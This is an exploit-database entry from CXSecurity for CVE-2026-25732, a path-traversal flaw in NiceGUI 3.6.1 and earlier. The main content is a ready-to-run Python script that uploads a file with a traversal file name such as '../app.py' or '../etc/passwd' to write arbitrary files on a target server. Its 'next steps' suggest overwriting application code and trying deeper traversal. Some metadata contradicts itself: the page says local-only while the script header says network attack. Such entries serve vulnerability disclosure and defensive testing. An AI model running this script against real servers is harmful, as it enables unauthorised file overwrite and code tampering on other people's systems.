---
title: NiceGUI 3.6.1 Path Traversal
url: https://cxsecurity.com/issue/WLB-2026050013
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-05-19
fetch_date: 2026-05-20T05:58:32.811605
---

# NiceGUI 3.6.1 Path Traversal

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **NiceGUI 3.6.1 Path Traversal** **2026.05.19**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2026-25732](https://cxsecurity.com/cveshow/CVE-2026-25732/ "Click to see CVE-2026-25732")**  CWE: **[CWE-22](https://cxsecurity.com/cwe/CWE-22 "Click to see CWE-22")** | |

# Exploit Title: NiceGUI 3.6.1 - Path Traversal
# Author: Mohammed Idrees Banyamer
# Instagram: @banyamer\_security
# GitHub: https://github.com/mbanyamer
# Date: 2025-06-06
# Tested on: NiceGUI <= 3.6.1 (Python 3.8–3.12 on Linux/Windows)
# CVE: CVE-2026-25732
#
# Affected Versions: <= 3.6.1 (fixed in 3.7.0)
#
# Type: Remote Arbitrary File Write / Path Traversal
# Platform: Web Application (Python / NiceGUI)
# Author Country: Jordan
# Weakness: CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)
# Attack Vector: Network
# Privileges Required: None
#!/usr/bin/env python3
"""
CVE-2026-25732 — NiceGUI arbitrary file write (path traversal)
Exploits unsanitized FileUpload.name when app uses it in save path.
Usage:
python exploit\_cve\_2026\_25732.py http://target:8080 "../etc/passwd" payload.txt
python exploit\_cve\_2026\_25732.py http://target:8080 "../app.py" malicious\_app.py
"""
import sys
import requests
from urllib.parse import urljoin
from pathlib import Path
def exploit(target\_url: str, malicious\_filename: str, local\_payload\_path: str | Path):
target\_url = target\_url.rstrip('/') + '/'
try:
with open(local\_payload\_path, 'rb') as f:
payload\_bytes = f.read()
except Exception as e:
print(f"[-] Cannot read payload file: {e}")
sys.exit(1)
files = {
'file': (malicious\_filename, payload\_bytes, 'application/octet-stream')
}
print(f"[\*] Target : {target\_url}")
print(f"[\*] Malicious name : {malicious\_filename}")
print(f"[\*] Payload size : {len(payload\_bytes):,} bytes")
try:
# NiceGUI upload endpoint is usually the page itself (multipart POST to /)
r = requests.post(
target\_url,
files=files,
timeout=12,
allow\_redirects=False
)
print(f"[+] Response : {r.status\_code} {r.reason}")
if r.status\_code in (200, 201, 204):
print("[SUCCESS] Upload accepted — file likely written")
elif r.status\_code == 413:
print("[!] Payload too large (server limit)")
elif r.status\_code in (400, 403, 422):
print("[!] Rejected — target may be patched / not vulnerable / wrong endpoint")
else:
print("[?] Unexpected response — check manually")
print("\nSnippet of response:")
print(r.text[:600].replace('\n', ' ').strip() + "..." if len(r.text) > 600 else r.text)
except requests.RequestException as e:
print(f"[-] Request failed: {e}")
print("\nNext steps:")
print(" • Check filesystem on target (if you have access)")
print(" • If you overwrote app.py / main.py → wait for reload / restart")
print(" • Try deeper traversal: '../../some/secret/file' etc.")
if \_\_name\_\_ == '\_\_main\_\_':
if len(sys.argv) != 4:
print(\_\_doc\_\_)
sys.exit(1)
target = sys.argv[1]
dest\_filename = sys.argv[2]
payload\_file = sys.argv[3]
exploit(target, dest\_filename, payload\_file)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026050013)

[Tweet](https://twitter.com/share)

Vote for this issue:
 2
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top